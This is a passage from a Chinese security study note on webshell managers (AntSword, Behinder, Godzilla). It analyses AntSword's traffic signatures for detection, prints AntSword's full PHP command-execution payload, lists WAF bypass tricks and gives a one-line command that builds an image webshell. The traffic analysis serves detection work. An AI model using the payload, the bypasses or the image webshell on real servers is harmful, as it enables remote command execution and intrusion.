+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 下载 AntSword-Loader  </span><br><span class="line">https://github.com/AntSwordProject/AntSword-Loader/releases</span><br><span class="line">2. 下载 antSword  </span><br><span class="line">https://github.com/AntSwordProject/antSword/releases</span><br><span class="line">3. 解压并进入 AntSword-Loader 目录，新建work目录，解压 antSword  到 work  目录</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>蚁剑有很多插件，自行选择：</p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181445916.png" alt="image-20221118144528518"></p>
+</blockquote>
+<h3 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎-Behinder"></a>冰蝎-Behinder</h3><p>冰蝎是一款基于 Java 开发的动态加密通信流量的新型 Webshell 客户端。老牌 Webshell 管理神器——中国菜刀的攻击流量特征明显，容易被各类安全设备检测，实际场景中越来越少使用，<strong>加密Webshell</strong> 正变得日趋流行。由于通信流量被加密，传统的 WAF、IDS 设备难以检测，给威胁狩猎带来较大挑战。</p>
+<p>冰蝎其最大特点就是对交互流量进行<strong>对称加密</strong>，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。冰蝎目前最新版本为 v3，兼容性已经日益完善，包括虚拟终端、Socks 代理、文件管理、反弹 shell、数据库管理等强大的功能，方便部署使用。</p>
+<blockquote>
+<ul>
+<li><p>有流量动态加密</p>
+</li>
+<li><p>冰蝎对上传的webshell有要求 具体要求要自己去了解</p>
+</li>
+<li><p>要上传冰蝎的shell，才可以连上冰蝎</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Behinder：</span><br><span class="line">https://github.com/rebeyond/Behinder/releases</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意新版冰蝎4.0的用法：[kali安装jdk8和切换jdk版本和4.0版本冰蝎的使用_Mauro_K的博客-CSDN博客](<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_44029310/article/details/126086895#:~:text=%E4%BA%8C%E3%80%814.0%E7%89%88%E6%9C%AC%E7%9A%84%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8,1%EF%BC%89%E4%B8%8B%E8%BD%BD%E4%B9%8B%E5%90%8E%EF%BC%8C%E8%A7%A3%E5%8E%8B%E8%BF%9B%E5%85%A5%E7%9B%AE%E5%BD%95%E3%80%82">https://blog.csdn.net/qq_44029310/article/details/126086895#:~:text=二、4.0版本的冰蝎使用,1）下载之后，解压进入目录。</a> 2）打开命令行，使用以下命令开启。)</p>
+</blockquote>
+<h3 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉-Godzilla"></a>哥斯拉-Godzilla</h3><p>不过，此哥斯拉非彼哥斯拉，他是继菜刀、蚁剑、冰蝎之后具有更多优点的 Webshell 管理工具，java语言开发，如名称一样，他的“凶猛”之处主要体现在：</p>
+<ul>
+<li>全部类型的 shell 能绕过市面大部分的静态查杀；</li>
+<li>流量加密能绕过过市面绝大部分的流量 Waf；</li>
+<li>Godzilla 自带的插件是冰蝎、蚁剑不能比拟的；</li>
+</ul>
+<p>另外需要注意</p>
+<ul>
+<li>哥斯拉有生成脚本的功能，要使用生成的脚本连接</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Godzilla：</span><br><span class="line">https://github.com/BeichenDream/Godzilla/releases</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见Webshell的流量特征"><a href="#常见Webshell的流量特征" class="headerlink" title="常见Webshell的流量特征"></a>常见Webshell的流量特征</h1><h2 id="蚁剑-AntSword-1"><a href="#蚁剑-AntSword-1" class="headerlink" title="蚁剑-AntSword"></a>蚁剑-AntSword</h2><h3 id="配置代理通过Burp抓蚁剑的包"><a href="#配置代理通过Burp抓蚁剑的包" class="headerlink" title="配置代理通过Burp抓蚁剑的包"></a>配置代理通过Burp抓蚁剑的包</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181352008.png" alt="image-20221118135200420" style="zoom:50%;" />
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181352707.png" alt="image-20221118135215408" style="zoom:50%;" />
+
+<h3 id="验证是否可以抓到包"><a href="#验证是否可以抓到包" class="headerlink" title="验证是否可以抓到包"></a>验证是否可以抓到包</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181353858.png" alt="image-20221118135311590" style="zoom:50%;" />
+
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181353107.png" alt="image-20221118135331742" style="zoom:50%;" />
+
+<h3 id="分析流量特征"><a href="#分析流量特征" class="headerlink" title="分析流量特征"></a>分析流量特征</h3><p>发送的请求是<code>whoami</code></p>
+<p>url解码后的原始请求，再经过处理后：</p>
+<blockquote>
+<p>格式化处理堆在一起的代码：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://tool.uvooc.com/formatphp/">PHP格式化,在线美化PHP代码-友沃可在线工具 (uvooc.com)</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line">	<span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">	<span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$tmdir</span>=<span class="string">&quot;.881e1928&quot;</span>;</span><br><span class="line">	@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">	@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">	@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;..&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$oparr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">		@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$ocwd</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$tmdir</span>);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">	<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;f8e&quot;</span>.<span class="string">&quot;34f&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;41a&quot;</span>.<span class="string">&quot;db4&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;m02970b7d35ca4&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;d2a660992fda23&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;g11df585b56663&quot;</span>],<span class="number">2</span>));</span><br><span class="line">	<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">		@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		@<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">		<span class="variable">$envarr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">				@<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$d</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>,@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">			<span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$d</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>,<span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>)&amp;&amp;<span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>)&amp;&amp;!<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>,<span class="variable">$d</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">				<span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">				<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">					<span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> False;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">			@<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">				<span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">				<span class="keyword">return</span> True;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> False;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">		<span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">			<span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">			@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">			@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">			@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">			<span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">			<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">			<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">			<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">			<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line">			<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">			<span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&amp;d2a660992fda23=tWY2QgIi92YXIvd3d3L2h0bWwvdGVzdCI7d2hvYW1pO2VjaG8gZTgzMWE0N2VjNzc4O3B3ZDtlY2hvIDk1ZmFjYTkxZg==&amp;g11df585b56663=Ct&amp;m02970b7d35ca4=PNL2Jpbi9zaA==</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结流量特征："><a href="#总结流量特征：" class="headerlink" title="总结流量特征："></a>总结流量特征：</h3><ul>
+<li>蚁剑对流量有<strong>base64加密</strong>，但是有些关键代码是没有被加密的，比如：PHP 中的 <code>ini_set</code>；ASP 中的 <code>OnError,response</code>。</li>
+</ul>
+<blockquote>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181424011.png" alt="image-20221118142436599" style="zoom:33%;" />
+</blockquote>
+<ul>
+<li>流量最中<strong>明显的特征</strong>为<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;)</code>;这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码。使用不同的编码方式，payload 的特征都会有所不同，但殊途同归，几乎都存在 <code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</code> 的不同编码形式。</li>
+</ul>
+<blockquote>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181427255.png" alt="image-20221118142735871" style="zoom:50%;" />
+</blockquote>
+<ul>
+<li><p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“<code>_0x.....=</code>”这种形式（下划线可替换为其他）所以，以<code>_0x</code>开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p>
+</li>
+<li><p>会带有base64编码解码等字符特征</p>
+</li>
+</ul>
+<blockquote>
+<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211181423479.png" alt="image-20221118142343962" style="zoom: 33%;" />
+</blockquote>
+<h2 id="冰蝎-Behinder-1"><a href="#冰蝎-Behinder-1" class="headerlink" title="冰蝎-Behinder"></a>冰蝎-Behinder</h2><blockquote>
+<p>新版冰蝎流量特征待测试</p>
+</blockquote>
+<h2 id="哥斯拉-Godzilla-1"><a href="#哥斯拉-Godzilla-1" class="headerlink" title="哥斯拉-Godzilla"></a>哥斯拉-Godzilla</h2><blockquote>
+<p>待分析</p>
+</blockquote>
+<h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><h2 id="WAF的本质"><a href="#WAF的本质" class="headerlink" title="WAF的本质"></a>WAF的本质</h2><p> 如果说我在SQL注入的本质中提到的三种SQL注入防御方式是对症下药，那么使用WAF进行防御就像是隔靴搔痒，无法根治漏洞。WAF的目的是在不可信数据被传给应用程序处理前，先将其过滤为可信数据。这里要提到一个概念：信任边界，即应用程序内的已定义的数据是处于信任边界内的，而任何来自用户输入的数据都处于信任边界外，属于不可信数据。华为的安全编码规范曾明确提出任何跨越信任边界传递的数据都需要被校验，因为所有的不可信数据都可能来自黑客攻击。 </p>
+<p>  WAF通过过滤或拦截用户输入中的SQL片段来防御SQL注入，如黑客输入的数据为<code>1 AND 1=1</code>，WAF侦测到SQL关键字AND，就会将用户输入过滤为<code>1 1=1</code>，或干脆直接拦截掉本次请求。这将会导致一个问题，便是当正常用户输入<code>YOU AND ME</code>时，请求也会被过滤和拦截，这将会严重破坏用户体验。但如果将校验的关键字减少，又会带来许多绕过WAF进行攻击的方式。 </p>
+<p>  由此可见，企业Web安全其实不是纯粹的Web安全技术，会夹杂很多用户体验与安全之间的权衡，甚至会考虑到程序猿们的开发体验。很多规模庞大复杂的祖传代码由于年久失修，会有各种各样的神奇BUG，如果重构，可能会带来彻底的崩溃。这个时候，游离在整个应用程序之外的WAF便是保证祖传代码安全性的最好选择。 </p>
+<p>  综上，WAF就是个既有用也没用的矛盾综合体，让安全工程师们又爱又恨，绕过层出不穷却不得不用，只好缝缝补补又一年。 </p>
+<h2 id="WAF-的绕过方法总结"><a href="#WAF-的绕过方法总结" class="headerlink" title="WAF 的绕过方法总结"></a>WAF 的绕过方法总结</h2><ol>
+<li>大小写绕过；这个说的很多了，有的 WAF 就是只过滤小写的关键字，例如 <code>script,union,select</code>等；</li>
+<li>双写关键字绕过；</li>
+<li>同价词替换：</li>
+</ol>
+<blockquote>
+<p>and 和 or 有可能不能使用，或者可以试下&amp;&amp;和||能不能用；</p>
+<p>&#x3D;不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那就是等于了；<br>空格不能使用（常见），可以使用如下符号进行替换：%20 %09 %0a %0b %0c %0d %a0 &#x2F;**&#x2F;；</p>
+</blockquote>
+<ol start="4">
+<li><p>编码绕过，16 进制绕过，URL 编码，Unicode 编码、 base64 编码、 ascll编码 绕过等；</p>
+</li>
+<li><p>使用注释符绕过（都可以去尝试）</p>
+</li>
+</ol>
+<blockquote>
+<p>常见的用于注释的符号有哪些：<code>//, -- , /**/, #, --+,-- -, ;，--a</code><br>内联注释用的更多，它有一个特性<code>/!**/</code>只有 MySQL 能识别(<code>/*！*/</code>表示注释里面的语句会被执行)。</p>
+</blockquote>
+<ol start="6">
+<li>⼲扰字符 绕过&#x2F;!&#x2F;</li>
+</ol>
+<h1 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h1><p>制作简单一句话图片马：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在php文件里面写了一句话木马，1.jpg是任意一张图片，将木马写入图片生成2.jpg</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b+<span class="number">1</span>.php/a <span class="number">2</span>.jpg</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>/b</code>和<code>/a</code>是什么参数，可以参考<code>copy</code>命令的<code>help</code>，，，<code>/?</code></li>
+<li>这种制作方式的本质是将webshell写入图片二进制文件末尾~~~</li>
+<li>即使是图片马也得要被服务器解析后 才能利用哦</li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://skykbs.com/2022/04/21/%E8%9A%81%E5%89%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/">蚁剑的基本流量特征分析 – skykbs</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://skykbs.com/2022/04/09/%E5%86%B0%E8%9D%8E%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/">冰蝎通讯原理及流量特征分析 – skykbs</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.nowcoder.com/issue/tutorial?zhuanlanId=zjbE7m&uuid=9d9987c816214f62b9266276da65e11f">编程入门教程_名企面试真题面经_牛客网_牛客网 (nowcoder.com)</a></li>
+</ul>
+</blockquote>
+<blockquote>
+<p><strong>声明：</strong></p>
+<ol>
+<li><p>若文章存在错误，望诸君不吝指正^</p>
+</li>
+<li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p>
+</li>
+</ol>
+</blockquote>
